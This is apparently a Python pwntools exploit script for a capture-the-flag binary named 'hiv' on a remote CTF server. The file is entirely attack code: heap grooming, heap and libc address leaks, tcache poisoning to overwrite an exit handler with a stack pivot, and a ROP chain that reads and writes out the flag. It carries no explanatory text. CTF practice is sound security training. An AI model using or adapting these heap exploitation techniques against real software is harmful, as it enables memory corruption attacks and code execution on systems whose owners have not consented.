from pwn import *
import time
elf = ELF("./hiv")
context.binary=elf
libc=elf.libc
#context.log_level='DEBUG'
k=0
while(True):
	k+=1
	print(k)
	#target=process([elf.path])
	target=remote('pwn.game.alcapwnctf.in',31233)
	def sla(string,val):
		target.sendlineafter(string,val)

	def sa(string,val):
		target.sendafter(string,val)

	def add(option,nnum=0x21):
		sla("choice>> ",str(1))
		sla("TYPE:\n1: int\n2: short int\n> ",str(option))
		sla("number: ",str(nnum))

	def free(option):
		sla("choice>> ",str(2))
		sla("TYPE:\n1: int\n2: short int\n> ",str(option))
		
	def leaks(option):
		sla("choice>> ",str(3))
		sla("TYPE:\n1: int\n2: short int\n> ",str(option))
		target.recvuntil("number :")
		leak=int(target.recvline().strip("\n"))
		return leak

	def bye(payload="A"*90):
		sla("choice>> ",str(4))
		sla("last? \n",payload)
	add(1)
	for i in range(35):
		add(2)
	for i in range(7):
		free(1)
		add(2)
	heap_leak=leaks(1)
	if heap_leak<0:
		heap_leak+=2**32
	print(hex(heap_leak))
	add(1,heap_leak+0x10)
	add(1,0x461)
	add(1)
	free(1)
	libc_base=leaks(1)-0x3ebca0
	if libc_base<0:
		libc_base+=2**32
	print(hex(libc_base))
	libc_exit_handler=libc_base+0x619f60
	libc_pivot=libc_base+0x000000000004fe20
	add(1)
	free(2)
	add(1)
	free(2)
	add(1,libc_exit_handler)
	add(2,heap_leak+0x70)
	add(1)
	free(1)
	add(2)
	free(1)
	add(2,libc_exit_handler)
	add(1,heap_leak+0x70)
	add(1)
	add(1)
	add(2,libc_pivot)
	add(1,libc_pivot)
	libc_base+=0x7ffa00000000
	poprdi=0x000000000002155f+libc_base
	poprsi=0x0000000000023e8a+libc_base
	poprdx=0x0000000000001b96+libc_base
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_read=libc_base+0x110180
	libc_write=libc_base+0x110250
	payload="A"*0x10+p64(poprdi)+p64(0x29a)+p64(poprsi)+p64(libc_malloc_hook)+p64(poprdx)+p64(100)+p64(libc_read)
	payload+=p64(poprdi)+p64(1)+p64(libc_write)
	bye(payload)
	target.recvuntil("We hope to see you again :D\n")
	r=""
	try:
		r=target.recv()
		print(r)
	except:
		target.close()
		continue
	if("evlz" in r):
		break
	else:
		target.close()
		continue
target.interactive()
